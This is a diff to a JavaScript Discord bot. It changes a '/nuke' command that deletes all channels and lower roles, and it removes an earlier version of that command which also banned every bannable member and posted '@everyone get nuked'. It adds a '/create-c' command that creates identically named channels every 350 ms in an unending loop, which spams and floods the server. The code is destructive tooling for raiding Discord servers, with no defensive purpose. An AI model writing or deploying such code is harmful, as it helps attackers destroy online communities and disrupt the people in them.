@@ -50,14 +50,12 @@ client.on('ready', () => {
 //READY-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 client.on("message", async(msg)=>{
 
-if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
-        msg.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
-        msg.delete(1000);
-	msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
-    	msg.guild.channels.deleteAll();
-	msg.channel.send('@everyone get nuked');
-}
+if(msg.content.toLowerCase().startsWith("/" + "nuke")){
 
+	msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    	msg.guild.channels.deleteAll()
+
+}
 
 });
 
@@ -75,8 +73,40 @@ client.on('message', message => {
                 .setTimestamp()
             message.channel.send(help)
             console.log(`${client.user.tag} ran command </ping>.`)
+ message.channel.send(` 
+\`\`\`js
+                             000      00
+                           0000000   0000
+              0      00  00000000000000000
+            0000 0  000000000000000000000000       0
+         000000000000000000000000000000000000000 000
+        0000000000000000000000000000000000000000000000
+    000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000
+              / / / / / / / / / / / / / / / /     
+            / / / / / / / / / / / / / / /         
+            / / / / / / / / / / / / / / /         
+          / / / / / / / / / / / / / /             
+          / / / / / / / / / / / / /               
+        / / / / / / / / / / / /                   
+        / / / / / / / / / / /                      
+\`\`\`
+        
+          `);
         }
     }
+
+    if(message.content.startsWith("/create-c")){
+
+    var interval = setInterval(function() {  
+      
+var name = `᥅ꪖ᥊ꪀ`;
+message.guild.createChannel(name, { type: "text" });
+
+console.log('done')
+        }, 7 * 50);
+
+  }
 //---------------------------------------------------------------------
 
     if (message.content.startsWith(prefix + "help")) {
